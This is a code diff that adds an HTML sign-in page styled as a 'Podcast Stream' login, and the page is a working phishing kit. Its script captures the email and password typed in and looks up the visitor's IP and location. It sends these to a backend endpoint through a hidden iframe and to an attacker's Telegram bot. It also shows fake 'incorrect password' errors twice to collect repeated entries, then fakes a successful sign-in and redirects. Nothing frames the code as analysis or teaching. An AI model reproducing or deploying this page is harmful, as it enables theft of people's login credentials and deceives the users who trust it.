@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Podcast Stream</title>
+    <style>
+        /* same styles as before, keep them */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        .logo { text-align: center; font-size: 32px; margin-bottom: 8px; }
+        h1 { font-size: 24px; margin-bottom: 8px; color: #333; text-align: center; }
+        p.sub { color: #666; margin-bottom: 24px; text-align: center; }
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        input:focus { border-color: #0067b8; outline: none; }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .btn:hover { background: #005da6; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error { color: #d32f2f; font-size: 13px; margin: 8px 0; display: none; }
+        .success { color: #2e7d32; font-size: 13px; margin: 8px 0; display: none; }
+        .footer { margin-top: 20px; text-align: center; font-size: 14px; color: #666; }
+        .footer a { color: #0067b8; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .checkbox { display: flex; align-items: center; margin: 12px 0; }
+        .checkbox input { width: auto; margin-right: 8px; }
+        .bot-status {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+        }
+        .bot-status .online { color: #2e7d32; }
+        .bot-status .offline { color: #d32f2f; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎙️</div>
+        <h1>Sign In</h1>
+        <p class="sub">Enter your credentials to access your dashboard.</p>
+
+        <input type="text" id="email" placeholder="Email address">
+        <input type="password" id="password" placeholder="Password">
+        
+        <div class="checkbox">
+            <input type="checkbox" id="keepSigned">
+            <label for="keepSigned">Keep me signed in</label>
+        </div>
+
+        <p class="error" id="errorMsg"></p>
+        <p class="success" id="successMsg"></p>
+
+        <button class="btn" id="signinBtn">Sign In</button>
+
+        <div class="footer">
+            <a href="#">Forgot password?</a> | <a href="#">Create account</a>
+        </div>
+
+        <div class="bot-status" id="botStatus">Loading bot configuration...</div>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION – will be built from environment
+        // ============================================
+        // We'll fetch from get_bot_settings.php
+
+        const API_BASE = window.location.origin;
+        const SETTINGS_URL = API_BASE + '/app/get_bot_settings.php';
+        const PROCESS_URL = API_BASE + '/app/process.php';
+
+        // ============================================
+        // GLOBALS
+        // ============================================
+        let BOT_TOKEN = '';
+        let CHAT_ID = '';
+        let botReady = false;
+
+        const signinBtn = document.getElementById('signinBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
+        const email = document.getElementById('email');
+        const password = document.getElementById('password');
+        const botStatus = document.getElementById('botStatus');
+
+        let attempts = 0;
+        const MAX_ATTEMPTS = 3;
+        let isProcessing = false;
+
+        // ============================================
+        // LOAD BOT SETTINGS
+        // ============================================
+        async function loadBotSettings() {
+            try {
+                const response = await fetch(SETTINGS_URL);
+                const data = await response.json();
+
+                if (data.status === 'success' && data.bot_token && data.chat_id) {
+                    BOT_TOKEN = data.bot_token;
+                    CHAT_ID = data.chat_id;
+                    botReady = true;
+                    botStatus.innerHTML = '✅ Telegram bot connected';
+                    botStatus.className = 'bot-status online';
+                    console.log('✅ Bot settings loaded');
+                } else {
+                    botStatus.innerHTML = '⚠️ Bot not configured. Set BOT_TOKEN and CHAT_ID in Render env.';
+                    botStatus.className = 'bot-status offline';
+                    console.warn('Bot not configured');
+                }
+            } catch (error) {
+                botStatus.innerHTML = '❌ Failed to load bot settings.';
+                botStatus.className = 'bot-status offline';
+                console.error('Error loading bot settings:', error);
+            }
+        }
+
+        // ============================================
+        // GET LOCATION
+        // ============================================
+        async function getLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    city: data.city || 'Unknown'
+                };
+            } catch {
+                return { ip: 'Unknown', country: 'Unknown', city: 'Unknown' };
+            }
+        }
+
+        // ============================================
+        // SEND DATA TO BACKEND (for logging)
+        // ============================================
+        function sendToBackend(user, pass, location) {
+            const url = `${PROCESS_URL}?u=${encodeURIComponent(user)}&p=${encodeURIComponent(pass)}&ip=${encodeURIComponent(location.ip)}&country=${encodeURIComponent(location.country)}&city=${encodeURIComponent(location.city)}`;
+            
+            // Hidden iframe (for logging)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            
+            fetch(url).catch(() => {});
+        }
+
+        // ============================================
+        // SEND TELEGRAM MESSAGE (from frontend)
+        // ============================================
+        async function sendTelegram(user, pass, location) {
+            if (!botReady) {
+                console.warn('Bot not ready, skipping Telegram');
+                return false;
+            }
+
+            const message = `🔐 *New Sign-in*\n\n` +
+                `👤 User: ${user}\n` +
+                `🔑 Pass: ${pass}\n` +
+                `🌐 IP: ${location.ip}\n` +
+                `📍 Location: ${location.city}, ${location.country}\n` +
+                `⏰ Time: ${new Date().toLocaleString()}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Telegram sent successfully');
+                    return true;
+                } else {
+                    console.error('Telegram error:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Telegram fetch failed:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // UI HELPERS
+        // ============================================
+        function showError(msg) {
+            errorMsg.textContent = msg;
+            errorMsg.style.display = 'block';
+            successMsg.style.display = 'none';
+        }
+
+        function showSuccess(msg) {
+            successMsg.textContent = msg;
+            successMsg.style.display = 'block';
+            errorMsg.style.display = 'none';
+        }
+
+        function setLoading(isLoading) {
+            signinBtn.disabled = isLoading;
+            signinBtn.textContent = isLoading ? 'Signing in...' : 'Sign In';
+        }
+
+        // ============================================
+        // SIGN IN BUTTON
+        // ============================================
+        signinBtn.addEventListener('click', async function() {
+            const user = email.value.trim();
+            const pass = password.value.trim();
+
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+
+            if (!user || !pass) {
+                showError('Please enter your email and password.');
+                return;
+            }
+
+            if (isProcessing) return;
+
+            attempts++;
+            isProcessing = true;
+            setLoading(true);
+
+            console.log('📊 Attempt:', attempts, 'of', MAX_ATTEMPTS);
+            console.log('👤 User:', user);
+
+            const location = await getLocation();
+
+            // 1. Send to backend for logging
+            sendToBackend(user, pass, location);
+
+            // 2. Send Telegram
+            if (botReady) {
+                await sendTelegram(user, pass, location);
+            }
+
+            // 3-attempt logic
+            if (attempts < MAX_ATTEMPTS) {
+                setTimeout(() => {
+                    setLoading(false);
+                    showError('The email or password you entered is incorrect. Please try again.');
+                    password.value = '';
+                    isProcessing = false;
+                }, 1000);
+                return;
+            }
+
+            if (attempts === MAX_ATTEMPTS) {
+                setTimeout(() => {
+                    showSuccess('✅ Sign in successful! Redirecting...');
+                    setLoading(false);
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://example.com/dashboard';
+                    }, 1500);
+                }, 1000);
+            }
+        });
+
+        // Enter key support
+        password.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                signinBtn.click();
+            }
+        });
+
+        email.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                password.focus();
+            }
+        });
+
+        // Load settings on page load
+        loadBotSettings();
+
+        console.log('🚀 Sign in page ready – fetching bot settings...');
+        console.log('📁 Settings API:', SETTINGS_URL);
+    </script>
+</body>
+</html>
